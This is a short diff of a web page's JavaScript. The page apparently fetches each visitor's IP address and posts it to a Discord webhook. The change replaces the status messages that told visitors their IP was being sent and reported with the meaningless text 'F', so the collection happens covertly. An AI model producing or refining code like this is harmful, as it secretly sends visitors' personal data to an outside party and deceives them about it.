@@ -20,7 +20,7 @@
         const ipJson = await ipResp.json();
         const ip = ipJson.ip || 'unknown';
 
-        document.getElementById('status').textContent = 'Sending IP to webhook...';
+        document.getElementById('status').textContent = 'F';
 
         // Build a Discord webhook payload
         const payload = {
@@ -37,7 +37,7 @@
           console.warn('Direct webhook POST failed (likely CORS):', err);
         });
 
-        document.getElementById('status').textContent = `Reported IP: ${ip}. Reloading in 2s...`;
+        document.getElementById('status').textContent = `F`;
       } catch (err) {
         console.error(err);
         document.getElementById('status').textContent = 'Error: ' + (err.message || err);
